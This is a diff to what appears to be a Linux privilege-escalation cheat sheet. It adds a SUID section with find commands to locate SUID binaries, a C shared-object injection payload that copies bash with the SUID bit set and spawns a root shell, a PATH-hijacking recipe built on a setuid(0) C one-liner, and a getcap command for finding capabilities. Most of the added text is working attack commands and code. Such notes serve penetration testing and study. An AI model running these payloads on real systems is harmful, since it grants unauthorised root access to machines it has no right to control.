@@ -83,6 +83,55 @@ void _init() {
 
 2. Run the exploit.
 
-## **SUID**
+## **[SUID]**
 
-WIP
+*Abuse the SUID files to gain privs.*
+
+### *Search for SUID Files*
+
+    find / -perm -u=s -type f 2>/dev/null
+    find / -type f -perm -04000 -ls 2>/dev/null
+    
+### *Share Object Injection*
+
+Look to replace / create a file being called in a script.
+
+```
+#include <stdio.h>                                                          
+#include <stdlib.h>                                                         
+                                                                            
+static void inject() __attribute__((constructor));                          
+                                                                            
+void inject() {                                                             
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); 
+}
+```
+
+Compile: `gcc -shared -o <NAME>.so -fPIC <NAME>.c`
+
+### *Binary Symlink*
+
+[WIP]
+
+### *Environmental Variables*
+
+We are looking at scripts that make use of the `$PATH` shortcuts.
+
+To see what kind of `$PATH` shortcut may be used, we can run the `strings` command to read the script.
+
+If a shortcut is being used, we abuse the `$PATH` and "hijack" it. In order to do so, a malicious script must be ran instead of the intended command.
+
+1. Make a malicious script named the same way as the `$PATH` command we are looking to hijack
+`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/<COMMAND NAME>.c`
+
+2. Compile: `gcc /tmp/<COMMAND NAME>.c -o /tmp/<COMMAND NAME>`
+
+3. Add /tmp to `$PATH`: `export PATH=/tmp:$PATH`
+
+4. Run the script.
+
+## [CAPABILITIES]
+
+### *Hunt Capabilities*
+
+    getcap -r / 2>/dev/null
